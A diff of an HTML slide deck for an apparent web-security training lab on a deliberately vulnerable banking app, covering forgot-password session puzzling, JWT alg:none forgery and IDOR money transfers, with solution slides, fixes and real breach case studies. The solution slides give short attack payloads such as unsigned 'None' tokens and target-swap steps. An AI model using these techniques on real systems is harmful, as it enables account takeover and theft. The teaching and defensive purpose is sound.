+</div>
+</div>
+
+</div>
+</div></section>
+<section id="s45" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; One State, One Meaning</h3>
 <div class="grid2 gap2">
 <div>
@@ -759,12 +800,14 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s45" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s46" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Identity &amp; Access Management</h3><p class="desc mt1" style="font-size:.9rem"><strong>IAM owns the definition of &ldquo;authenticated.&rdquo;</strong> If two different variables both look like proof of identity, that is a design gap before it is a coding bug.</p><p class="desc mt1" style="font-size:.9rem"><strong>One state, one meaning.</strong> A partially authenticated session must be structurally incapable of reaching an authenticated page.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Penetration Testing</h3><p class="desc mt1" style="font-size:.9rem"><strong>Static analysis cannot see this.</strong> The code is syntactically perfect &mdash; the flaw is in the <em>sequence</em>. Only someone deliberately taking steps out of order will find it.</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Which of our checks prove identity, and which only prove that someone started a login?&rdquo;</p>
 </div></section>
-<section id="s46" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s47" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L25</span><div><div class="sol-cwe">CWE-841 · A07:2021</div><h2 style="margin:.06em 0">Session Puzzling (Forgot-Password)</h2><div class="sol-where">&#128205; /forgot-password · /forgot-password/reset</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Take over another account through the password-recovery flow.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The recovery flow writes session state that the authenticated area trusts, without binding <b>progress</b> to the <b>target account</b>. Mixing recovery state and login state in the same session lets one be used to stand in for the other.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">step 1 writes the trusted session user</span></div><div class="sol-lrow"><span class="sol-lk">L1 / L2</span><span class="sol-lv">progress not bound to the target — swap it in</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">stage bound to the account that earned it</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> changing the Customer ID at step 1 clears <code>recovery_stage</code>, and the reset gate requires the stage to have been earned by the same user — <code>recovery_stage_uid === recovery_uid</code>. The swap is refused.</p></div></div></div></div></section>
+<section id="s48" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L25</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 / L2 &mdash; Stage carryover (same technique both levels)</h2><span class="sol-where" style="margin-left:auto">Session Puzzling (Forgot-Password)</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Progress (<code>recovery_stage</code>) is tracked <b>separately</b> from the target (<code>recovery_uid</code>) and isn't bound to it. <i>(L2 currently mirrors L1 — a distinct binding is still to be differentiated.)</i></p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Earn the stage on your own account, then swap the target underneath it.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">complete flow for yourself → reach reset (stage=2) → new tab: submit victim's ID (overwrites recovery_uid, keeps stage) → drive /forgot-password/reset</div><div class="sol-paynote">you reset the victim's password</div></div></section>
+<section id="s49" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">Change Healthcare, 2024 &mdash; one remote-access portal without MFA</h2>
 <div class="rw mt2">
@@ -774,37 +817,12 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">Closer to home &mdash; AIIMS Delhi, 2022</h3><p class="desc mt1" style="font-size:.88rem">India&rsquo;s flagship public hospital lost its core systems to ransomware. Patient registration, billing, lab reports and appointments ran on paper for roughly <strong>two weeks</strong>, with around <strong>40 million</strong> patient records implicated. Clinical operations, not just data, were the casualty.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> where in our estate is strong authentication <em>implemented but not enforced</em> &mdash; and who would know?</p></div>
 </div></section>
-<section id="s47" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L25 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Reach the Dashboard Without the OTP</h2>
-<div class="yt">
-<div class="grid2 gap2">
-<div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">Begin a login so the password step succeeds, then try to reach an authenticated page without ever completing the second factor. At this level the obvious direct URL is blocked &mdash; find the page that still trusts a half-finished session.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">Watch what the app stores after step 1 versus step 2 (browser DevTools &rarr; Application &rarr; Storage).<br/>Not every page re-checks that the session is <em>fully</em> authenticated.<br/>The weakness is a page that accepts &ldquo;login started&rdquo; as if it meant &ldquo;login finished.&rdquo;</p>
-</div>
-<div>
-<p class="sub mb1">When it works</p>
-<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
-<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
-</div>
-</div>
-
-</div>
-</div></section>
-<section id="s48" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L25</span><div><div class="sol-cwe">CWE-841 · A07:2021</div><h2 style="margin:.06em 0">Session Puzzling (Forgot-Password)</h2><div class="sol-where">&#128205; /forgot-password · /forgot-password/reset</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Take over another account through the password-recovery flow.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The recovery flow writes session state that the authenticated area trusts, without binding <b>progress</b> to the <b>target account</b>. Mixing recovery state and login state in the same session lets one be used to stand in for the other.</p></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">step 1 writes the trusted session user</span></div><div class="sol-lrow"><span class="sol-lk">L1 / L2</span><span class="sol-lv">progress not bound to the target — swap it in</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">stage bound to the account that earned it</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> changing the Customer ID at step 1 clears <code>recovery_stage</code>, and the reset gate requires the stage to have been earned by the same user — <code>recovery_stage_uid === recovery_uid</code>. The swap is refused.</p></div></div></div></div></section>
-<section id="s49" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L25</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Auth-key overload</h2><span class="sol-where" style="margin-left:auto">Session Puzzling (Forgot-Password)</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Step 1 writes <code>$_SESSION['user']</code> — the <b>same key the authenticated area trusts</b> — for whatever Customer ID you type, before any OTP or security questions.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Submit the victim's Customer ID, then just browse to the app. You're already “logged in” as them.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">/forgot-password (victim's ID)  →  /dashboard</div><div class="sol-paynote">watch /debug/session to see it</div></div></section>
-<section id="s50" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L25</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 / L2 &mdash; Stage carryover (same technique both levels)</h2><span class="sol-where" style="margin-left:auto">Session Puzzling (Forgot-Password)</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Progress (<code>recovery_stage</code>) is tracked <b>separately</b> from the target (<code>recovery_uid</code>) and isn't bound to it. <i>(L2 currently mirrors L1 — a distinct binding is still to be differentiated.)</i></p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Earn the stage on your own account, then swap the target underneath it.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">complete flow for yourself → reach reset (stage=2) → new tab: submit victim's ID (overwrites recovery_uid, keeps stage) → drive /forgot-password/reset</div><div class="sol-paynote">you reset the victim's password</div></div></section>
-<section id="s51" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s50" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 4</span><span style="color:var(--t3);font-size:.8rem">L12 &bull; CWE-347 &bull; OWASP A02:2021</span></div>
 <h1>JWT alg:none &mdash; Forge Your Own Identity Card</h1>
 <p class="big mt2">&ldquo;We&rsquo;re going to promote ourselves to administrator by editing a cookie.&rdquo;</p>
 </div></section>
-<section id="s52" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s51" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">What a Token Actually Is</h3>
 <p class="desc mb2">After you log in, the server hands you a JSON Web Token &mdash; a badge you present on every later request. It has three parts, separated by dots.</p>
 <div class="jwt mt2">
@@ -817,7 +835,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 <div class="card yellow-left mt3"><p class="desc">Notice the problem hiding in plain sight: <strong style="color:var(--t1)">the token itself tells the server how to verify the token.</strong> The attacker controls the token.</p></div>
 </div></section>
-<section id="s53" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s52" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">The Attack &mdash; Three Edits</h3>
 <div class="grid2 gap2">
 <div>
@@ -845,12 +863,43 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s54" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s53" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">We did not steal an admin password.<br/>We simply wrote &ldquo;admin&rdquo; on our own badge &mdash; and the guard waved us through.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">The cryptography was never broken.<br/>The application just agreed not to use it.</p>
 </div></section>
-<section id="s55" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s54" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">L12 &bull; JWT forgery</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">the token&rsquo;s own claim about how it was signed &mdash; even &ldquo;signed with nothing&rdquo;</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;Do we enforce the exact algorithm and actually verify the signature?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc"><strong>hardened tokens</strong> &mdash; <code>alg:none</code> rejected by default, the algorithm pinned, signing keys in an HSM/KMS, short lifetimes</p></div>
+</div>
+</div></section>
+<section id="s55" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L12 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Promote Yourself to Administrator</h2>
+<div class="yt">
+<div class="grid2 gap2">
+<div>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You turned your ordinary customer session into an administrator&rsquo;s.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have <strong>no information</strong> about what they changed, and about 5 minutes to try.</p></div>
+</div>
+<div>
+<p class="sub mb1">When it works</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
+<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
+</div>
+</div>
+
+</div>
+</div></section>
+<section id="s56" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; The Server Decides</h3>
 <div class="grid2 gap2">
 <div>
@@ -878,12 +927,15 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
-<section id="s56" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s57" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Application Security</h3><p class="desc mt1" style="font-size:.9rem"><strong>Dependency defaults are design decisions.</strong> &ldquo;We used the standard library&rdquo; is not the same as &ldquo;we configured it safely.&rdquo; Someone must own that choice and be able to justify it.</p><p class="desc mt1" style="font-size:.9rem"><strong>Pin the algorithm, verify every claim.</strong> Expiry, issuer and audience are not optional extras.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Identity &amp; Access Management</h3><p class="desc mt1" style="font-size:.9rem"><strong>Anything carrying role or entitlement is a crown-jewel asset.</strong> It must be signed, short-lived, revocable, and validated server-side on every request &mdash; never trusted because it arrived in a cookie.</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Where in our stack does a user-supplied token decide what that user is allowed to do?&rdquo;</p>
 </div></section>
-<section id="s57" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s58" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L12</span><div><div class="sol-cwe">CWE-347 · A02:2021</div><h2 style="margin:.06em 0">JWT Forgery → Admin</h2><div class="sol-where">&#128205; access_token cookie / Bearer; proof at /admin/vault</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Forge a token claiming <b>role: admin</b> without the signing key.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The app trusts a <b>browser-readable JWT</b> for identity and role. A JWT is only as good as the server's verification of its signature — if the server doesn't properly verify, the client can rewrite the claims.</p><div class="sol-note"><strong>Note.</strong> Flag caveat: forge <code>sub</code> = <b>your own</b> id (+ role:admin) so the flag at /admin/vault is keyed to the account you'll submit from.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">signature present but never verified</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">alg:none accepted</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">only lowercase 'none' blocked</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">HS256 pinned + verified</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> algorithm <b>pinned to HS256</b>, HMAC verified with the server secret (constant-time), and <code>exp</code> checked. <code>none</code>/<code>None</code> and any tampered token are rejected.</p></div></div></div></div></section>
+<section id="s59" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L12</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; alg:none accepted</h2><span class="sol-where" style="margin-left:auto">JWT Forgery → Admin</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Replaying the old signature now fails (the HMAC <i>is</i> checked) — but the verifier still accepts <b>unsigned</b> tokens when the header says <code>alg:none</code>.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Drop the signature and declare no algorithm.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">header {"alg":"none"} + admin payload + empty signature</div><div class="sol-paynote">no key required</div></div></section>
+<section id="s60" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L12</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Case-sensitive alg check</h2><span class="sol-where" style="margin-left:auto">JWT Forgery → Admin</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Plain lowercase <code>none</code> is now rejected — but the check is case-sensitive, so a differently-cased value slips past into the same unsigned-accept path.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Use a capitalised variant.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">header {"alg":"None"}  (or "NONE") + empty signature</div><div class="sol-paynote">string compare missed the variants</div></div></section>
+<section id="s61" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">Microsoft, 2023 &mdash; forged tokens opened government mailboxes</h2>
 <div class="rw mt2">
@@ -893,33 +945,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <div class="card yellow-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">Closer to home &mdash; WazirX, 2024</h3><p class="desc mt1" style="font-size:.88rem">Attackers subverted the multi-signature approval process at the Indian crypto exchange. Once the signing step was compromised, the fraudulent transfer looked <em>authorised</em> to every downstream check. Roughly <strong>$234 million</strong> (about &#8377;2,000 crore) left in a single incident.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> what would it cost us if one signing key leaked &mdash; can we revoke it, do we rotate it, and would we even detect tokens we never issued?</p></div>
 </div></section>
-<section id="s58" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L12 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Promote Yourself to Administrator</h2>
-<div class="yt">
-<div class="grid2 gap2">
-<div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">You hold a normal customer token. At this level &ldquo;alg:none&rdquo; alone is rejected, so you will need to look more closely at how the token is validated. Change your role to admin and get the server to accept it.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">Decode your token at jwt.io &mdash; see the header, the payload and the role field.<br/>Try the <code>none</code> algorithm first; if it is blocked, inspect exactly which algorithms are accepted.<br/>The signing key may be weak, exposed, or confused with a public one. What does the server trust to verify?</p>
-</div>
-<div>
-<p class="sub mb1">When it works</p>
-<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
-<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
-</div>
-</div>
-
-</div>
-</div></section>
-<section id="s59" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L12</span><div><div class="sol-cwe">CWE-347 · A02:2021</div><h2 style="margin:.06em 0">JWT Forgery → Admin</h2><div class="sol-where">&#128205; access_token cookie / Bearer; proof at /admin/vault</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Forge a token claiming <b>role: admin</b> without the signing key.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The app trusts a <b>browser-readable JWT</b> for identity and role. A JWT is only as good as the server's verification of its signature — if the server doesn't properly verify, the client can rewrite the claims.</p><div class="sol-note"><strong>Note.</strong> Flag caveat: forge <code>sub</code> = <b>your own</b> id (+ role:admin) so the flag at /admin/vault is keyed to the account you'll submit from.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">signature present but never verified</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">alg:none accepted</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">only lowercase 'none' blocked</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">HS256 pinned + verified</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> algorithm <b>pinned to HS256</b>, HMAC verified with the server secret (constant-time), and <code>exp</code> checked. <code>none</code>/<code>None</code> and any tampered token are rejected.</p></div></div></div></div></section>
-<section id="s60" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L12</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Signature not verified</h2><span class="sol-where" style="margin-left:auto">JWT Forgery → Admin</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The verifier only checks that a signature <i>segment exists</i> — it never checks the HMAC.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Edit the payload, leave any signature string in place.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">{"sub":"&lt;your id&gt;","role":"admin", …}</div><div class="sol-paynote">signature ignored entirely</div></div></section>
-<section id="s61" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L12</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; alg:none accepted</h2><span class="sol-where" style="margin-left:auto">JWT Forgery → Admin</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Replaying the old signature now fails (the HMAC <i>is</i> checked) — but the verifier still accepts <b>unsigned</b> tokens when the header says <code>alg:none</code>.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Drop the signature and declare no algorithm.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">header {"alg":"none"} + admin payload + empty signature</div><div class="sol-paynote">no key required</div></div></section>
-<section id="s62" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">L12</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Case-sensitive alg check</h2><span class="sol-where" style="margin-left:auto">JWT Forgery → Admin</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Plain lowercase <code>none</code> is now rejected — but the check is case-sensitive, so a differently-cased value slips past into the same unsigned-accept path.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Use a capitalised variant.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">header {"alg":"None"}  (or "NONE") + empty signature</div><div class="sol-paynote">string compare missed the variants</div></div></section>
-<section id="s63" data-phase="Live Labs" class="slide">
+<section id="s62" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <div class="flex-row mb2">
 <span class="badge badge-red">&#128308; Demo 5</span>
@@ -928,13 +954,10 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <h2>Transfer Money from Someone Else's Account</h2>
 <p class="big mt2">The "From Account" field is greyed out. You can only transfer from your own account.</p>
 <p class="big mt1" style="color:var(--amber)">Or can you?</p>
-<div class="mt3 flex-row" style="justify-content:center;gap:1.2rem">
-<p class="desc" style="font-size:1.1rem">⏱️ 10 minutes.</p>
-<button class="timer-btn" onclick="timerStart(600)">▶ Start 10:00</button>
-</div>
+
 </div>
 </section>
-<section id="s64" data-phase="Live Labs" class="slide">
+<section id="s63" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">Instructions</h3>
 <div class="step"><div class="step-num">1</div><div><p class="desc">Go to the <strong style="color:var(--t1)">Transfer</strong> page. Notice the "From Account" field is <strong style="color:var(--t3)">disabled (greyed out)</strong>.</p></div></div>
@@ -945,7 +968,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <p class="desc">Think about it: the UI says you can't change this field. But <strong style="color:var(--t1)">who enforces that</strong> — the browser, or the server?</p>
 </div>
 </section>
-<section id="s65" data-phase="Live Labs" class="slide">
+<section id="s64" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">The Answer</h3>
 <pre><code><span class="cm">&lt;!-- What the Transfer page renders --&gt;</span>
@@ -959,7 +982,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <p class="mt2 desc">The <code>disabled</code> attribute is a UI hint to the browser. The <code>hidden</code> input is what the server reads. Change value <code>"1"</code> to <code>"4"</code> (another user's account), submit the form, and the transfer goes through. The server never checked ownership.</p>
 </div>
 </section>
-<section id="s66" data-phase="Live Labs" class="slide">
+<section id="s65" data-phase="Live Labs" class="slide">
 <div class="slide-inner center">
 <h2 style="color:var(--red)">The developer thought a disabled form field was a security control.</h2>
 <p class="big mt2" style="color:var(--t2)">It's a suggestion to the browser. The server must enforce it independently.</p>
@@ -967,7 +990,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <p class="big">Client-side validation is UX.<br/>Server-side validation is security.<br/>They are not interchangeable.</p>
 </div>
 </section>
-<section id="s67" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s66" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,3vw,2.4rem)">We did not hack anything.<br/>We changed one number &mdash; and the money moved.</h1>
 <div class="sep" style="max-width:200px;margin:2.2rem auto"></div>
 <div class="grid3" style="gap:1rem;text-align:left">
@@ -978,7 +1001,38 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <p class="big mt3" style="color:var(--t2)">The application asked &ldquo;who are you?&rdquo; when it logged us in.<br/>It never once asked <strong style="color:var(--t1)">&ldquo;is this actually your account?&rdquo;</strong></p>
 <p class="mt2 desc">Authentication without authorisation is a doorman who checks your ID at the entrance,<br/>then lets you into every room in the building.</p>
 </div></section>
-<section id="s68" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s67" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">L1 &bull; IDOR (broken object-level authorization)</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">that the account number you send is one you actually own</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;We checked <em>who you are</em> &mdash; did we check <em>what you may touch</em>?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc"><strong>authorization, not just authentication</strong> &mdash; object-level ownership checks, and reconciliation on every money movement</p></div>
+</div>
+</div></section>
+<section id="s68" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">L1 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Move Money From an Account That Is Not Yours</h2>
+<div class="yt">
+<div class="grid2 gap2">
+<div>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You moved money out of an account that was not yours.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have <strong>no information</strong> about what they changed, and about 5 minutes to try.</p></div>
+</div>
+<div>
+<p class="sub mb1">When it works</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
+<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
+</div>
+</div>
+
+</div>
+</div></section>
+<section id="s69" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; Five Words in the Query</h3>
 <div class="grid2 gap2">
 <div>
@@ -1008,12 +1062,15 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 </div>
 </div></section>
